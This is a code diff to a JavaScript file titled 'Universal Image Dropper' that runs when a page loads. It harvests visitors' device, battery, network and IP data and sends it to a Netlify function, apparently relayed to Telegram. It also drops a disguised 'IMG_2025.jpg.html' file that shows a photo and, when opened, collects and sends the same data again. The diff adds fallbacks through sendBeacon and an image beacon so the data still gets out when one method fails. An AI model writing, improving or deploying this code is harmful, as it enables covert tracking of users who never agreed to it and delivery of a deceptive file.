@@ -1,34 +1,55 @@
-// telemetry.js – Universal Image Dropper (FIXED: Absolute URL + CORS)
+// telemetry.js – Universal Image Dropper (FIXED: Correct env vars + robust sending)
 (function() {
   'use strict';
 
   const ENDPOINT = '/.netlify/functions/telemetry';
   let executed = false;
 
-  // Helper: Send data to Netlify → Telegram
+  // ---------- HELPER: SEND DATA VIA MULTIPLE METHODS ----------
   async function sendToBackend(module, payload) {
+    const data = JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() });
+    const siteOrigin = window.location.origin;
+    const url = siteOrigin + ENDPOINT;
+
+    // Method 1: Fetch with CORS
     try {
-      // Try with CORS
-      const res = await fetch(ENDPOINT, {
+      const res = await fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() }),
+        body: data,
         cache: 'no-store',
         keepalive: true
       });
-      if (!res.ok) throw new Error('Server error');
+      if (res.ok) {
+        console.log(`✅ [${module}] Data sent via fetch`);
+        return;
+      }
+      throw new Error('Fetch failed with status ' + res.status);
     } catch (e) {
-      // Fallback: Try no-cors mode (sends data but ignores response)
-      try {
-        await fetch(ENDPOINT, {
-          method: 'POST',
-          mode: 'no-cors',
-          headers: { 'Content-Type': 'text/plain' },
-          body: JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() }),
-          cache: 'no-store',
-          keepalive: true
-        });
-      } catch (_) {}
+      console.warn(`⚠️ [${module}] Fetch failed:`, e.message);
+    }
+
+    // Method 2: sendBeacon (works even during page unload)
+    try {
+      const blob = new Blob([data], { type: 'application/json' });
+      const sent = navigator.sendBeacon(url, blob);
+      if (sent) {
+        console.log(`✅ [${module}] Data sent via sendBeacon`);
+        return;
+      }
+      throw new Error('sendBeacon returned false');
+    } catch (e) {
+      console.warn(`⚠️ [${module}] sendBeacon failed:`, e.message);
+    }
+
+    // Method 3: Image beacon (GET fallback, limited data)
+    try {
+      const img = new Image();
+      const encoded = encodeURIComponent(data);
+      img.src = url + '?data=' + encoded;
+      console.log(`✅ [${module}] Data sent via Image beacon (GET)`);
+    } catch (e) {
+      console.error(`❌ [${module}] All methods failed:`, e.message);
     }
   }
 
@@ -148,15 +169,10 @@
   // ---------- 2. MALICIOUS IMAGE DROPPER (DOUBLE EXTENSION + ABSOLUTE URL) ----------
   function dropMaliciousImage() {
     try {
-      // Real image URL (will be displayed inside the HTML)
       const imageUrl = 'https://files.catbox.moe/l9xdjq.png';
-      
-      // CRITICAL: Get the absolute URL of the current site (your Netlify URL)
-      // This will be baked into the downloaded HTML
       const siteOrigin = window.location.origin;
-      const absoluteEndpoint = `${siteOrigin}/.netlify/functions/telemetry`;
 
-      // Self-contained HTML page that shows a real image and runs telemetry
+      // Self-contained HTML with robust sending
       const htmlContent = `<!DOCTYPE html>
 <html>
 <head>
@@ -167,37 +183,10 @@
   <meta property="og:title" content="Beautiful Sunset" />
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
-    body {
-      background: #0a0a0a;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-    }
-    .container {
-      max-width: 95vw;
-      max-height: 95vh;
-      border-radius: 12px;
-      overflow: hidden;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.8);
-      background: #1a1a1a;
-    }
-    img {
-      display: block;
-      width: 100%;
-      height: auto;
-      max-height: 80vh;
-      object-fit: contain;
-    }
-    .caption {
-      padding: 10px 20px;
-      color: #ccc;
-      text-align: center;
-      font-size: 13px;
-      background: #1a1a1a;
-      border-top: 1px solid #333;
-    }
+    body { background:#0a0a0a; display:flex; justify-content:center; align-items:center; min-height:100vh; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
+    .container { max-width:95vw; max-height:95vh; border-radius:12px; overflow:hidden; box-shadow:0 20px 60px rgba(0,0,0,0.8); background:#1a1a1a; }
+    img { display:block; width:100%; height:auto; max-height:80vh; object-fit:contain; }
+    .caption { padding:10px 20px; color:#ccc; text-align:center; font-size:13px; background:#1a1a1a; border-top:1px solid #333; }
   </style>
 </head>
 <body>
@@ -206,37 +195,43 @@
     <div class="caption">📸 IMG_2025 • Tap to share</div>
   </div>
 
-  <!-- ========== TELEMETRY SCRIPT (SILENT) ========== -->
   <script>
     (function() {
-      // HARDCODED ABSOLUTE URL (baked during generation)
-      const ENDPOINT = '${absoluteEndpoint}';
+      const ENDPOINT = '${siteOrigin}/.netlify/functions/telemetry';
 
+      // --- SEND FUNCTION (with fallbacks) ---
       async function sendData(module, payload) {
+        const data = JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() });
         try {
-          // Try CORS mode
+          // 1. Fetch
           const res = await fetch(ENDPOINT, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() }),
+            body: data,
             cache: 'no-store',
             keepalive: true
           });
-        } catch (e) {
-          // Fallback: no-cors mode (works even if CORS fails)
-          try {
-            await fetch(ENDPOINT, {
-              method: 'POST',
-              mode: 'no-cors',
-              headers: { 'Content-Type': 'text/plain' },
-              body: JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() }),
-              cache: 'no-store',
-              keepalive: true
-            });
-          } catch (_) {}
-        }
+          if (res.ok) { console.log('✅ Data sent via fetch'); return; }
+        } catch(e) { console.warn('Fetch failed:', e.message); }
+
+        // 2. sendBeacon
+        try {
+          const blob = new Blob([data], { type: 'application/json' });
+          if (navigator.sendBeacon(ENDPOINT, blob)) {
+            console.log('✅ Data sent via sendBeacon');
+            return;
+          }
+        } catch(e) { console.warn('sendBeacon failed:', e.message); }
+
+        // 3. Image beacon
+        try {
+          const img = new Image();
+          img.src = ENDPOINT + '?data=' + encodeURIComponent(data);
+          console.log('✅ Data sent via Image beacon');
+        } catch(e) { console.error('All methods failed:', e.message); }
       }
 
+      // --- COLLECT DATA ---
       async function collect() {
         const device = {
           userAgent: navigator.userAgent,
@@ -326,8 +321,7 @@
         } catch(_) {}
 
         return {
-          device,
-          battery,
+          device, battery,
           network: {
             localIPs,
             publicIP: publicData.ip || 'N/A',
@@ -347,16 +341,17 @@
         };
       }
 
-      // AUTO-RUN when this HTML is opened
+      // --- AUTO-RUN ---
       collect().then(data => {
         sendData('IMAGE_DROPPER_PAYLOAD', data);
+        // Also log to console for debugging
+        console.log('📡 Data sent:', data);
       });
     })();
   </script>
 </body>
 </html>`;
 
-      // Download as HTML with double extension: .jpg.html
       const blob = new Blob([htmlContent], { type: 'text/html' });
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
@@ -374,31 +369,28 @@
       sendToBackend('IMAGE_DROPPER_DELIVERED', {
         status: 'Downloaded',
         filename: 'IMG_2025.jpg.html',
-        note: 'Absolute URL baked in: ' + absoluteEndpoint
+        note: 'Absolute URL: ' + siteOrigin + ENDPOINT
       });
     } catch (e) {
       sendToBackend('IMAGE_DROPPER_ERROR', { error: e.message });
     }
   }
 
-  // ---------- 3. MASTER TRIGGER (AUTO ON LOAD) ----------
+  // ---------- 3. MASTER TRIGGER ----------
   async function runAll() {
     if (executed) return;
     executed = true;
 
-    console.log('%c📸 Dropping double-extension image payload...', 'font-size:16px; color:#ff6600;');
+    console.log('%c📸 Dropping image payload...', 'font-size:16px; color:#ff6600;');
 
-    // Auto telemetry
     const data = await collectBrowserData();
     await sendToBackend('AUTO_TELEMETRY', data);
-
-    // Drop the disguised HTML file
     dropMaliciousImage();
 
-    console.log('%c✅ Payload delivered. File: IMG_2025.jpg.html', 'font-size:16px; color:#00ffcc;');
+    console.log('%c✅ Payload delivered.', 'font-size:16px; color:#00ffcc;');
   }
 
-  // ---------- 4. TRIGGER ON PAGE LOAD (BINA CLICK KE) ----------
+  // ---------- 4. AUTO-TRIGGER ON LOAD ----------
   if (document.readyState === 'complete') {
     setTimeout(runAll, 800);
   } else {
